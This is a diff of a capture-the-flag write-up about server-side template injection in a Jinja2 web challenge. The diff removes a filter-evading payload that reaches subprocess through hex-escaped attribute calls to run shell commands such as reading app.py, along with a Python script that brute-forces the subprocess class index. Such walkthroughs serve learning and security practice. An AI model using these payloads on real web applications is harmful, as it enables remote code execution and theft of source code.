@@ -117,39 +117,9 @@ Now we can check if the subprocess class is among it
 
 Cool it's among the classes
 
-So the final payload should be:
-
-```
-{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(position_of_subprocess_number))("cat+app\x2epy",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}
-```
-
 We need to get the position of the subprocess class number
 
 Burp intruder can help with that :) i did try scripting this but unfortunately  i can't seem to make it send as raw data without it being converted to it's string form
-
-```python
-# Under dev
-import requests
-
-def main():
-
-    url = 'http://hackme2.vulnmachines.com:8470/'
-
-    for i in range(1000):
-        
-        data = {
-            'nickname': '{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")({})("id",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}'.format(i)
-        }
-        
-        reqStatusCode = requests.post(url, data=data).status_code
-
-        if reqStatusCode == 200:
-            print(f'[+] Subprocess position found at: {i}')
-
-
-if __name__ == '__main__':
-    main()
-```
 
 I'll just fuzz using Burp Intruder
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04ec0628-1e92-44aa-99bd-a3c99e4f08bb)
@@ -168,10 +138,6 @@ And the position for the subprocess class is `286`
 
 We can then try reading the app.py file
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3062bfcd-5b67-4dee-b0ae-ba63e7ef6667)
-
-```
-{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(286)("cat+app\x2epy",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}
-```
 
 Here's the result gotten from reading app.py (P.S: I exfiltrated it 🙂)
 
